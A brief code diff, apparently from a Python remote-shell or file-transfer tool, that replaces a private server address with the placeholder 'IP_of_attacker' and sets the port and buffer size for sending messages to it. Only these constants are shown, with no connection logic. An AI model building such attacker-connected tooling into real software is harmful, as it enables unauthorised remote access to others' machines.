@@ -6,7 +6,7 @@ import re
 import tqdm
 
 
-SERVER_HOST = "10.100.102.94"
+SERVER_HOST = "IP_of_attacker"
 SERVER_PORT = 5004
 BUFFER_SIZE = 1440  # max size of messages, setting to 1440 after experimentation, MTU size
 # separator string for sending 2 messages in one go
